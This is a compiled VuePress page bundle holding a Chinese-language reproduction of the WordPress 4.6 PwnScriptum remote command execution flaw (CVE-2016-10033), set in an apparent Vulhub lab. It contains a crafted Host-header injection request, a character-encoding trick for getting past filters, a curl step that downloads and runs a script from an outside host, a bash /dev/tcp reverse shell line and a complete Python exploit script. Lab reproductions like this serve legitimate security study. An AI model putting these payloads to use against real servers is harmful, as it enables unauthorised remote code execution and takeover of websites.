import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o as l,c as i,a as n,b as s,d as e,e as t}from"./app-58e4a7d6.js";const c={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),d=n("p",null,"参考：",-1),u={href:"https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html",target:"_blank",rel:"noopener noreferrer"},m=t('<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub编译及运行测试环境</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build\ndocker-compose up -d\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>由于Mysql初始化需要一段时间，所以请等待。成功运行后，访问<code>http://your-ip:8080/wp-admin/install.php</code>打开站点，初始化管理员用户名和密码后即可使用（数据库等已经配置好，且不会自动更新）。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>发送如下数据包，可见<code>/tmp/awesome_poc</code>已经成功创建：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /wp-login.php?action=lostpassword HTTP/1.1\nHost: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}awesome_poc}} null)\nConnection: close\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nAccept: */*\nContent-Length: 56\nContent-Type: application/x-www-form-urlencoded\n\nwp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022254237.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022254142.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>但实际利用起来，还是有一些坑需要踏过。具体的坑有这么几个：</p><ol><li>执行的命令不能包含大量特殊字符，如<code>:</code>、引号等。</li><li>命令会被转换成小写字母</li><li>命令需要使用绝对路径</li><li>需要知道某一个存在的用户的用户名</li></ol><p>为了解决这些坑，漏洞作者想出了，利用<code>${substr{0}{1}{$spool_directory}}</code>代替<code>/</code>，用<code>${substr{10}{1}{$tod_log}}</code>代替空格的方法。</p><p>但是还是有很多字符不能用，所以我们需要将待执行的命令放到第三方网站中，然后通过<code>curl -o /tmp/rce example.com/shell.sh</code>的方法先将他下载到/tmp目录中，再去执行。</p><p>所以，总体来说利用过程如下：</p><ul><li>编写反弹shell的exp，放到某个网页里。有如下要求： <ul><li>整个url的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径</li><li>访问该网页不能跳转，因为follow跳转的参数是<code>-L</code>（大写）</li></ul></li><li>拼接成命令<code>/usr/bin/curl -o/tmp/rce example.com/shell.sh</code>和命令<code>/bin/bash /tmp/rce</code></li><li>将上述命令中的空格和<code>/</code>转换成<code>${substr{10}{1}{$tod_log}}</code>和<code>${substr{0}{1}{$spool_directory}}</code></li><li>拼接成HTTP包的Host头：<code>target(any -froot@localhost -be ${run{command}} null)</code></li><li>依次发送这两个拼接好的数据包</li></ul>',15),k={href:"https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/exploit.py",target:"_blank",rel:"noopener noreferrer"},v=n("code",null,"shell_url",-1),b=n("code",null,"shell_url",-1),h={href:"http://example.com/shell.sh%E7%9A%84%E5%86%85%E5%AE%B9%E4%B8%BA%EF%BC%9A",target:"_blank",rel:"noopener noreferrer"},g=n("div",{class:"language-text line-numbers-mode","data-ext":"text"},[n("pre",{class:"language-text"},[n("code",null,`bash -i >& /dev/tcp/your-reverse—shell-ip/9999 0>&1
`)]),n("div",{class:"line-numbers","aria-hidden":"true"},[n("div",{class:"line-number"})])],-1),_=t(`<p>执行即可获得shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python wordpress.py http://192.168.174.128:8080 example.com/shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>监听9999端口，接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022259514.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token comment"># wordpress&#39;s url</span>
target <span class="token operator">=</span> <span class="token string">&#39;http://127.0.0.1&#39;</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token keyword">else</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token comment"># Put your command in a website, and use the website&#39;s url</span>
<span class="token comment"># don&#39;t contains &quot;http://&quot;, must be all lowercase</span>
shell_url <span class="token operator">=</span> <span class="token string">&#39;example.com/1.txt&#39;</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token keyword">else</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token comment"># an exists user</span>
user <span class="token operator">=</span> <span class="token string">&#39;admin&#39;</span>

<span class="token keyword">def</span> <span class="token function">generate_command</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    command <span class="token operator">=</span> <span class="token string">&#39;\${run{%s}}&#39;</span> <span class="token operator">%</span> command
    command <span class="token operator">=</span> command<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;\${substr{0}{1}{$spool_directory}}&#39;</span><span class="token punctuation">)</span>
    command <span class="token operator">=</span> command<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39; &#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;\${substr{10}{1}{$tod_log}}&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">&#39;target(any -froot@localhost -be %s null)&#39;</span> <span class="token operator">%</span> command


session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;user_login&#39;</span><span class="token punctuation">:</span> user<span class="token punctuation">,</span>
    <span class="token string">&#39;redirect_to&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;wp-submit&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Get New Password&#39;</span>
<span class="token punctuation">}</span>
session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;Host&#39;</span><span class="token punctuation">:</span> generate_command<span class="token punctuation">(</span><span class="token string">&#39;/usr/bin/curl -o/tmp/rce &#39;</span> <span class="token operator">+</span> shell_url<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#39;</span>
<span class="token punctuation">}</span>
session<span class="token punctuation">.</span>allow_redirects <span class="token operator">=</span> <span class="token boolean">False</span>
target <span class="token operator">+=</span> <span class="token string">&#39;/wp-login.php?action=lostpassword&#39;</span>
session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>

session<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&#39;Host&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> generate_command<span class="token punctuation">(</span><span class="token string">&#39;/bin/bash /tmp/rce&#39;</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6);function x(w,f){const a=p("ExternalLinkIcon");return l(),i("div",null,[r,d,n("ul",null,[n("li",null,[n("a",u,[s("https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html"),e(a)])])]),m,n("p",null,[s("将上述过程写成"),n("a",k,[s("exp脚本"),e(a)]),s("，将脚本中target修改成你的目标，user修改成一个已经存在的用户，"),v,s("修改成你放置payload的网址。（或直接将target作为第一个参数、"),b,s("作为第二个参数）")]),n("blockquote",null,[n("p",null,[n("a",h,[s("example.com/shell.sh的内容为："),e(a)])]),g]),_])}const E=o(c,[["render",x],["__file","Wordpress 4.6 任意命令执行漏洞 PwnScriptum.html.vue"]]);export{E as default};
